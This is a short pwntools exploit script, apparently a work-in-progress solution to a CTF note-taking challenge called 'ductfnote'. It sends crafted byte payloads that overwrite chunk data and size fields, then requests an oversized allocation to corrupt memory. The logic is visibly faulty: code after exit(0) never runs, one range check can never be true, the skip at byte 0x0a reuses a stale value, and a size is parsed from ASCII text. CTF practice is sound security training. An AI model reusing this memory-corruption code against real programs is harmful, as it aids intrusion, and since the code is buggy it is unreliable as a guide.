#!/bin/python3

from pwn import *

MAX_SIZE = 0x7f

io = process('./ductfnote')

io.sendlineafter(b'>> ', b'1')

io.sendlineafter(b'Size: ', str(MAX_SIZE).encode())

io.sendlineafter(b'>> ', b'3')

payload = b''
i = 0x0
while(i < 0xf5):
    if i == 0xa:
        i += 0x1
    elif 0xdd <= i <= 0xe4:
        b = 0xff
    elif 0xd6 <= i <= 0xdc:
        b = 0x0
    elif i == 0xd5:
        b = 0x21
    else:
        b = i
    payload += bytes([b])
    i += 0x1
payload += b'\n'

io.sendafter(b'\n', payload)

#time to crack a small one
io.sendlineafter(b'>> ', b'1')

io.sendlineafter(b'Size: ', str(int.from_bytes(b'7fffff7f', 'big', signed=True)))

io.interactive()
exit(0)

io.sendlineafter(b'>> ', b'3')

payload = b''
i = 0x0
while(i < 0xf6):
    if i == 0xa:
        i += 0x1
    elif 0xfd <= i <= 0xf4:
        b = 0x0
    elif i == 0xf5:
        b = 0xb1
    else:
        b = i
    payload += bytes([b])
    i += 0x1
payload += b'\n'

io.sendafter(b'\n', payload)

